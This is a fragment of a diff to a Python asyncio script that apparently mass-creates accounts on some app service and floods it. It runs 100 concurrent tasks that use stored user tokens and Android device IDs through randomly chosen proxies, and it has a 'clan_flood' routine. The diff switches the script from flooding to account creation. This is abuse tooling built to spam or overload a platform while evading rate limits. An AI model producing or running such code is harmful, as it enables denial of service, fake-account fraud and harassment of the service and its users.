@@ -186,8 +186,9 @@ async def main():
                 continue
             break
         lock = asyncio.Lock()
-        #asyncio.create_task(create_accounts(session, lock))
-        asyncio.create_task(flood_s(session, lock))
+        asyncio.create_task(create_accounts(session, lock))
+        #await asyncio.sleep(5)
+    #    asyncio.create_task(flood_s(session, lock))
         await asyncio.sleep(9999999999999999999999999999999999999999)
 
 with open("abee.txt", "r") as f:
@@ -354,11 +355,12 @@ async def create_accounts(session, lock):
         await asyncio.gather(*tasks)
 
 async def flood_s(session, lock):
-    async def flood_k():
+    async def flood_k(session):
         while True:
             if not ACCOUNTS:
                 continue
-            async with aiohttp.ClientSession(connector=ProxyConnector.from_url(random.choice(PROXY_WORK), ssl=False, limit=0)) as session:
+            ke = "ke"
+            if ke == "ke":
                 account = random.choice(ACCOUNTS)
                 user_id, token, android_id, register_time, device_register_time = account.split(":")
                 nonce = str(uuid.uuid4())
@@ -478,7 +480,7 @@ async def flood_s(session, lock):
                     print(e)
                     continue
 
-    tasks = [asyncio.create_task(flood_k()) for _ in range(100)]
+    tasks = [asyncio.create_task(flood_k(session)) for _ in range(100)]
     await asyncio.gather(*tasks)
 
 async def clan_flood(session, clan_id, region):
